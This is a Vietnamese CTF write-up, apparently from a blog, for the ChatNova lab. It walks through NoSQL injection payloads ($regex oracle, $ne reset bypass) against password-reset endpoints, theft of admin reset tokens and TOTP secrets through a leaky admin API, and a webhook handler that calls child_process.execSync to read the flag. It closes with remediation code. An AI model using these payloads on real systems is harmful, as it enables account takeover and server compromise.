+++
title = "ChatNova — NoSQL Injection Chain to RCE"
date = 2026-11-17T00:00:00+07:00
draft = false
tags = ["Web", "NoSQL Injection", "MongoDB", "2FA", "RCE", "Node.js"]
categories = ["Writeups"]
summary = "ChatNova: NoSQL Injection ở luồng reset mật khẩu, API lộ dữ liệu admin và webhook JavaScript có thể thực thi lệnh để đọc flag."
ShowToc = true
TocOpen = false
+++

ChatNova là lab CTF Web với chuỗi NoSQL Injection, lộ dữ liệu quản trị và thực thi JavaScript phía server. Bài viết đối chiếu luồng khai thác trong bản thảo với sáu ảnh request/response và giao diện trong `ChatNova.docx`; ảnh cuối xác nhận webhook trả về flag. Các đoạn source dưới đây được giữ theo bản thảo, không phải kết quả kiểm tra một bản source ứng dụng độc lập.

## 1. Tổng quan thử thách

ChatNova là nền tảng trao đổi nội bộ có tài khoản người dùng, kênh chat, quản lý thành viên và webhook integration. Không có đăng ký công khai. Đề cho biết tài khoản `support@chatnova.local` tồn tại; tài khoản admin bật TOTP 2FA, còn script webhook được quảng bá là chạy trong sandbox.

**Mục tiêu không chỉ là đăng nhập admin:** điểm kết thúc của bài là kích hoạt một webhook handler có khả năng thực thi lệnh phía server để đọc file `/root/flag.txt` và nhận chuỗi flag trong HTTP response.

### Attack chain

```text
Landing page / roster
        │
        ▼
Biết email support@chatnova.local
        │
        ▼
Forgot-password → token được lưu trong MongoDB
        │
        ▼
Blind NoSQLi tại password-policy → suy ra reset token (nhánh theo hint)
        │
        ▼
Reset mật khẩu → đăng nhập support (luồng theo bản thảo)
        │
        ▼
GET /api/v1/admin/users?query=... qua session support
        │
        ├─ $where/error disclosure (theo hint)
        └─ Hoặc API trả luôn trường services (đã thấy trong lab)
        │
        ▼
Lấy reset token + TOTP secret admin
        │
        ▼
Reset mật khẩu → sinh mã TOTP → đăng nhập admin
        │
        ▼
Admin → Integrations → Incoming Webhook → Handler Script
        │
        ▼
POST /api/v1/webhooks/<token> → server thực thi handler
        │
        ▼
Đọc /root/flag.txt → response có FLAG{...}
```

## 2. Giai đoạn 1 — Initial Access bằng Blind NoSQL Injection

**Hình 1 — Reset password trả thành công khi `token` là object `$ne`.**

![Hình 1 — Reset password thành công trong Burp](/images/imported/chatnova/image1.png)

### 2.1. Reconnaissance và reset token

Landing page tiết lộ danh sách thành viên và email `support@chatnova.local`. Endpoint quên mật khẩu:

```http
POST /api/v1/auth/forgot-password HTTP/1.1
Content-Type: application/json

{"email":"support@chatnova.local"}
```

Request này yêu cầu backend tạo reset token rồi lưu trong trường `services.password.reset.token`. Response dạng *“If the email exists ...”* không tự nó tiết lộ token.

### 2.2. Lỗ hổng tại `password-policy`

Theo code của đề:

```javascript
app.post('/api/v1/auth/password-policy', async (req, res) => {
  const { token } = req.body;
  const user = await User.findOne({
    'services.password.reset.token': token
  });
  if (!user) return res.json({ valid: false });
  res.json({ valid: true, policy: { /* ... */ } });
});
```

**Root cause trong đoạn code:** server không kiểm tra `typeof token === 'string'` trước khi dùng giá trị làm filter. Nếu cấu hình Mongoose/schema cho phép toán tử đi qua, object có `$regex` hoặc `$ne` được xử lý như điều kiện truy vấn thay vì chuỗi token nguyên văn. Hành vi cụ thể còn phụ thuộc schema và các lớp lọc truy vấn; không thể mặc định mọi ứng dụng Mongoose đều khai thác được theo cách này.

Request kiểm thử:

```http
POST /api/v1/auth/password-policy HTTP/1.1
Content-Type: application/json

{"token":{"$regex":"^a"}}
```

Với `$regex`, điều kiện truy vấn trở thành: *có reset token nào bắt đầu bằng `a` không?* Response `valid:true` / `valid:false` đóng vai trò **boolean oracle**. Từ đó có thể suy ra từng ký tự của chuỗi bí mật bằng cách tăng dần tiền tố. Bản thảo mô tả token là base64url dài 43 ký tự, với charset `A–Z`, `a–z`, `0–9`, `-`, `_`. Đây là giả định của nhánh dò token, chưa được xác nhận bằng ảnh hoặc code sinh token. Vì query chỉ lọc theo token và không ràng buộc email, oracle có thể khớp token của bất kỳ tài khoản nào có yêu cầu reset đang tồn tại; cần xác minh tài khoản trước khi kết luận đã lấy token support. Dấu `-` và `_` không cần escape khi đặt ngoài character class của regex.

### Nhánh quan sát được: `$ne` tại `reset-password`

Hình 1 thể hiện request trực tiếp tới `/api/v1/auth/reset-password`:

```json
{"token":{"$ne":null},"newPassword":"123456789"}
```

Response trả `HTTP 200` với message `Password has been reset successfully`. Đây là bằng chứng endpoint reset chấp nhận payload dạng object và báo đổi mật khẩu thành công; nó không chứng minh đã dò được token bằng `$regex` hay tài khoản bị đổi chính là support. Với MongoDB, điều kiện `$ne: null` khớp field tồn tại và có giá trị khác null. Nếu handler dùng điều kiện này để chọn user rồi cập nhật mật khẩu, kẻ gọi có thể bỏ qua việc biết token cụ thể. Ảnh không chứa source của handler reset, nên cách chọn bản ghi chính xác chưa được xác minh.

Hai nhánh cần được phân biệt: `$regex` dùng oracle để suy ra giá trị token; `$ne` tại endpoint reset có thể bỏ qua phép so sánh token và dẫn tới đổi mật khẩu một bản ghi khớp điều kiện. Hình 1 xác nhận nhánh thứ hai, không ghi lại quá trình dò tiền tố.

### 2.3. Sử dụng token đã tìm thấy

Theo luồng của bài, token hợp lệ được gửi tới:

```http
POST /api/v1/auth/reset-password HTTP/1.1
Content-Type: application/json

{"token":"<support-reset-token>","newPassword":"<new-password>"}
```

Sau khi reset thành công, đăng nhập tài khoản support thông qua `POST /login`; form này sử dụng `application/x-www-form-urlencoded`. Support không yêu cầu TOTP theo mô tả đề bài.

**Mục tiêu của giai đoạn 1:** có session support để gọi API chỉ yêu cầu `requireAuth`. Luồng dò token và đăng nhập support được mô tả trong bản thảo; riêng Hình 1 không đủ xác nhận danh tính tài khoản sau reset.

## 3. Giai đoạn 2 — Chiếm quyền admin và vượt 2FA

### 3.1. Tạo reset token admin

Khi đã có session support, bài hướng tới việc yêu cầu reset mật khẩu `admin@chatnova.local` để có token lưu trong database. Việc reset mật khẩu admin **không tự động** vượt TOTP: server vẫn yêu cầu mã 6 chữ số.

### 3.2. Lỗ hổng `GET /api/v1/admin/users`

**Hình 2 — Request user query và response JSON chứa dữ liệu user.**

![Hình 2 — Request và response user query qua Burp Repeater](/images/imported/chatnova/image3.png)

Đoạn code đề cung cấp:

```javascript
app.get('/api/v1/admin/users', requireAuth, async (req, res) => {
  const queryParam = req.query.query;
  let filter = {};
  if (queryParam) {
    try { filter = JSON.parse(queryParam); } catch (e) { /* ... */ }
  }
  const users = await User.find(filter, '-password').lean();
  res.json({ users, total: users.length });
});
```

Ở đây xuất hiện **ba root cause bổ trợ nhau**:

1. **Broken Function Level Authorization:** đường dẫn nằm trong namespace `/admin`, nhưng middleware chỉ dùng `requireAuth` (xác thực đã đăng nhập), không chứng minh người gọi có vai trò admin.
2. **NoSQL Injection:** `JSON.parse(req.query.query)` biến chuỗi do client kiểm soát thành object rồi chuyển nguyên vẹn vào `User.find(filter)`, cho phép toán tử truy vấn như `$where`.
3. **Excessive Data Exposure:** `User.find(filter, '-password').lean()` chỉ loại field `password` ở top-level; các field `services.password.reset.token` và `services.totp.secret` vẫn có thể được trả về. `lean()` chuyển kết quả sang JavaScript object thông thường, không phải cơ chế ẩn secret.

### 3.3. Nhánh theo hint: `$where` và error-based disclosure

Theo bản thảo, Hint 3 gợi ý `$where` để đánh giá biểu thức JavaScript trên document MongoDB. Nhánh này cần server cho phép JavaScript phía database và filter không bị chặn; bộ ảnh hiện có không thể hiện request `$where`. Trong trường hợp biểu thức `throw` một giá trị nhạy cảm và backend đưa exception message ra HTTP response, dữ liệu có thể bị tiết lộ qua **error-based NoSQL injection**.

Về bản chất, đây là chuỗi:

```text
query do client kiểm soát
   → JSON.parse()
   → User.find(filter)
   → MongoDB đánh giá $where
   → exception chứa giá trị nội bộ
   → response phản chiếu exception
```

Trong Hình 2, **không cần `$where`** để thấy rò rỉ. Request truy vấn thông thường với filter `{"username":"admin"}` trả về `HTTP 200` và object có `role`, `services.password.reset.token` và phần đầu của `services.totp` ở sát mép ảnh. Điều này trực tiếp chứng minh lỗi excessive data exposure và, nếu sử dụng session support, còn là bằng chứng cho lỗi phân quyền.

> Hình 2 đọc rõ reset token admin, nhưng phần TOTP bị cắt nên chưa thể xác nhận giá trị `services.totp.secret` chỉ từ ảnh này. Việc lấy TOTP secret là bước theo bản thảo; không nên mô tả ảnh như đã hiển thị đầy đủ secret. Cookie trong ảnh cũng chưa đủ xác định session thuộc support nếu không có đối chiếu danh tính.

### 3.4. Vì sao 2FA không còn bảo vệ được admin?

**Hình 3 — Trang đăng nhập admin yêu cầu mã 2FA.**

![Hình 3 — Giao diện admin bị chặn bởi 2FA](/images/imported/chatnova/image4.png)

TOTP dựa vào một khóa bí mật chung và thời gian hiện tại (thường chu kỳ 30 giây). Khi database API tiết lộ `services.totp.secret`, attacker có đủ đầu vào để tính được cùng loại mã mà ứng dụng xác minh. Vì thế, dù màn hình đăng nhập báo **“Two-factor authentication code required”**, lớp 2FA đã mất ý nghĩa khi secret server-side bị lộ.

Theo luồng trong bản thảo, reset mật khẩu admin rồi dùng TOTP secret lấy được để tạo mã đăng nhập. Bộ ảnh không ghi lại toàn bộ thao tác lấy secret hoặc sinh mã; Hình 4 xác nhận kết quả đăng nhập ở giao diện.

**Bằng chứng quan sát:** ảnh chụp trình duyệt cho thấy người dùng `Marcus Chen`, menu **Admin → User Management / Integrations**, và kênh `#devops`. Đây là bằng chứng phiên admin đã được thiết lập, nhưng chưa phải bằng chứng RCE.

**Hình 4 — Phiên admin đăng nhập thành công, hiển thị menu Admin và kênh riêng.**

![Hình 4 — Đăng nhập thành công dưới tài khoản admin](/images/imported/chatnova/image5.png)

## 4. Giai đoạn 3 — RCE thông qua Incoming Webhook và lấy flag

### 4.1. Tính năng đích

Từ menu **Admin → Integrations**, người dùng admin tạo một **Incoming Webhook** với trường **Handler Script (server-side JavaScript)**. Trong ảnh lab, integration tên `aaaa` ở trạng thái `Active`, có đường dẫn dạng:

```text
/api/v1/webhooks/<webhook-token>
```

Màn hình có các trường `Integration Name`, `Type`, `Description`, `Target Channel`, `External Webhook URL`, `Handler Script`. Đối với webhook incoming, External Webhook URL có thể để trống theo thao tác đã thực hiện trong lab.

### 4.2. Root cause: sandbox không phải security boundary

Mã nguồn được cung cấp:

```javascript
const sandbox = {
  payload: req.body,
  require: require, // Node.js module loader bị đưa vào sandbox
};
const context = vm.createContext(sandbox);
const script = new vm.Script(`(function() { ${integration.script} })()`);
const result = script.runInContext(context);
```

**Root cause chính nằm ở `require: require`.** Ứng dụng lấy `require` từ tiến trình Node.js chính rồi cấp vào context của script do người dùng admin kiểm soát. Khi script có quyền dùng module loader này, giới hạn của context không còn ngăn được việc gọi các module Node.js có quyền tương đương tiến trình server.

**Phân biệt `node:vm` và `vm2`:** đoạn code trong bản thảo sử dụng `vm.createContext` và `vm.Script`, tương ứng API của `node:vm`. Không có package/source độc lập để xác nhận ứng dụng dùng `vm2` hoặc một CVE cụ thể. Với đoạn code này, vấn đề là cấp host `require` cho script không tin cậy. Tài liệu Node.js cũng nêu rõ `node:vm` không phải cơ chế bảo mật để chạy code không tin cậy. [Tài liệu Node.js](https://nodejs.org/api/vm.html)

### 4.3. Webhook handler

Handler xuất hiện trong Hình 5 sử dụng `child_process` và gọi shell để đọc file flag:

```javascript
return require('child_process')
  .execSync('cat /root/flag.txt')
  .toString();
```

Giải thích cơ chế:

- `require('child_process')`: lấy module thao tác với process của Node.js.
- `execSync(...)`: yêu cầu hệ điều hành thực hiện lệnh đồng bộ theo quyền của tiến trình backend.
- `cat /root/flag.txt`: lệnh mà lời giải sử dụng để đọc file chứa flag.
- `.toString()`: chuyển dữ liệu trả về thành chuỗi JavaScript.
- `return`: đưa chuỗi này về luồng xử lý webhook; theo lời giải, backend đưa nó vào HTTP response.

**Điều kiện thành công:** handler phải được server thực thi; process Node.js cần có quyền đọc file flag; kết quả phải được API trả về cho người gọi. Chỉ nhìn thấy script xuất hiện trong giao diện **chưa chứng minh** các điều kiện đó đã xảy ra.

### 4.4. Kích hoạt webhook và response mục tiêu

Theo luồng bài CTF, sau khi tạo integration, endpoint incoming webhook được gọi bằng phương thức POST với JSON body. Mẫu endpoint trong lời giải:

```http
POST /api/v1/webhooks/<webhook-token> HTTP/1.1
Content-Type: application/json

{}
```

**Response thành công, rút gọn nội dung flag:**

```json
{"success":true,"result":"FLAG{...}"}
```

Đây là **mẫu cấu trúc** của response với flag được thay bằng placeholder. Hình 6 trong tài liệu gốc thể hiện `HTTP/1.1 200 OK`, `"success":true` và `"result":"FLAG{...}\n"`, xác nhận flag đã được trả về thực tế. Ký tự `\n` là xuống dòng cuối file, không thuộc flag.

### 4.5. Đối chiếu với bằng chứng hình ảnh trong tài liệu gốc

**Hình 5 — Integration được tạo:** webhook `aaaa` ở trạng thái `Active`, có script đọc file flag và bộ đếm `0 times` tại thời điểm chụp. Hình này ghi nhận cấu hình trước lần gọi webhook.

![Hình 5 — Incoming webhook đã được tạo, ở trạng thái Active](/images/imported/chatnova/image2.png)

**Hình 6 — Response cuối xác nhận lấy được flag:** Burp Repeater thể hiện `POST /api/v1/webhooks/...` với body JSON, phía response có `HTTP/1.1 200 OK`, `"success":true` và trường `result` chứa `FLAG{...}`. Đây mới là bằng chứng kết thúc bài CTF.

![Hình 6 — Burp Repeater trả HTTP 200 và kết quả FLAG trong JSON response](/images/imported/chatnova/image6.png)

Hình 6 xác nhận webhook đã trả về flag. Kết hợp handler trong Hình 5 với response này, chuỗi ảnh hỗ trợ kết luận chức năng scripting đã được dùng để thực thi lệnh đọc file trong lab.

## 5. Root Cause Summary

| Lớp | Root cause | Điều kiện bị phá vỡ | Hậu quả trong attack chain |
|---|---|---|---|
| Password reset | Theo code bản thảo, `token` đi trực tiếp vào filter; ảnh reset chấp nhận `$ne` | Phải chứng minh biết token cụ thể trước khi đổi mật khẩu | Có thể tạo blind oracle hoặc bỏ qua phép so sánh token, tùy endpoint |
| User management | Chỉ yêu cầu đăng nhập, không kiểm tra role admin | Tài khoản thường không được gọi API quản trị | Session support có thể truy vấn dữ liệu admin |
| MongoDB filtering | `query` do client kiểm soát đi trực tiếp vào `find()` | Người dùng không được cung cấp toán tử truy vấn tùy ý | `$where` có thể dẫn đến thực thi biểu thức trong query và lỗi tiết lộ dữ liệu |
| Data minimization | Projection `'-password'` không loại `services` | API liệt kê user không được trả credentials/secret | TOTP secret và reset token lộ trực tiếp |
| Webhook scripting | Cấp host `require` vào `node:vm` context | Script không tin cậy không được chạm tới Node.js/process/FS | Có khả năng thực thi lệnh với quyền server và đọc flag |

**Điểm then chốt:** đây không phải một lỗ hổng độc lập, mà là một **exploit chain**. Lỗ hổng thứ nhất mở ra session support; lỗ hổng thứ hai làm lộ bí mật admin và đánh bại 2FA; lỗ hổng thứ ba biến quyền admin trên ứng dụng thành khả năng đọc file hệ thống.

## 6. Remediation — Hướng sửa lỗi

### 6.1. Chặn NoSQL injection trong token validation

```javascript
const { token } = req.body;
if (typeof token !== 'string' || !/^[A-Za-z0-9_-]{43}$/.test(token)) {
  return res.status(400).json({ error: 'Invalid token format' });
}
const user = await User.findOne({ 'services.password.reset.token': token });
```

Regex độ dài 43 ở trên chỉ phù hợp nếu code sinh token thực tế bảo đảm định dạng đó; cần điều chỉnh theo ứng dụng. Áp dụng kiểm tra kiểu cho cả endpoint policy lẫn reset; kiểm tra hạn dùng và ràng buộc đúng tài khoản, tiêu thụ token một lần bằng thao tác cập nhật nguyên tử. Nên lưu hash token thay vì token nguyên văn, bổ sung rate limit và tránh để API policy làm oracle kiểm tra token.

### 6.2. Khóa quyền admin + không trả secret

```javascript
app.get('/api/v1/admin/users', requireAuth, requireAdmin, async (req, res) => {
  const { username } = req.query;
  const users = await User.find(
    typeof username === 'string' ? { username } : {},
    'username email displayName role avatar title department status'
  ).lean();
  res.json({ users, total: users.length });
});
```

Không nhận tùy ý JSON MongoDB query từ client. Nên dùng filter schema/allowlist cho từng field, chặn `$where` và các toán tử không cần thiết, định nghĩa projection **allowlist** thay vì cố loại bỏ từng trường bí mật.

### 6.3. Cô lập webhook thực sự

Không expose `require`, `process`, filesystem, shell, network và các capability nguy hiểm vào script context. Đối với script không tin cậy, chỉ `node:vm` là không đủ để coi như ranh giới bảo mật; cần sandbox/process/container được cô lập phù hợp, giới hạn quyền hệ điều hành, thời gian chạy, CPU/memory và filesystem. Tốt hơn là chỉ hỗ trợ các handler template an toàn thay vì JavaScript tùy ý.

### 6.4. Phục hồi sau khai thác

Vô hiệu hóa/reset các token bị lộ, xoay vòng TOTP secret, reset các session bị ảnh hưởng, rà soát webhook integration đã tạo và kiểm tra audit log các request đến endpoint liên quan.

## 7. Kết quả và giới hạn bằng chứng

Ảnh cuối xác nhận `POST /api/v1/webhooks/<token>` trả `HTTP 200`, `success: true` và `result` chứa flag. Những điểm được ghi lại trực tiếp gồm reset password bằng payload `$ne`, API trả dữ liệu admin, màn hình yêu cầu TOTP, phiên có menu Admin, cấu hình handler và response cuối.

Nhánh dò token bằng `$regex`, nhánh `$where` và thao tác lấy/sử dụng TOTP secret là phần giải thích theo bản thảo, chưa được bộ ảnh ghi lại đầy đủ. Không nên dùng các ảnh hiện có để khẳng định đã thực hiện từng bước đó. Kết quả lấy flag được xác nhận độc lập với việc bộ ảnh còn thiếu một số bước trung gian.

## Tài liệu đối chiếu

- `ChatNova.docx`: sáu ảnh dùng trong bài, gồm response flag đọc được ở ảnh cuối.
- Bản thảo Markdown: mô tả hint, luồng giải và các đoạn code; chưa có repository/source đầy đủ để kiểm chứng độc lập.
- [MongoDB: điều kiện không bằng null](https://www.mongodb.com/docs/manual/tutorial/query-for-null-fields/#non-equality-filter).
- [MongoDB: `$where`](https://www.mongodb.com/docs/manual/reference/operator/query/where/).
- [Mongoose: query casting](https://mongoosejs.com/docs/tutorials/query_casting.html).
- [Node.js: `vm`](https://nodejs.org/api/vm.html).
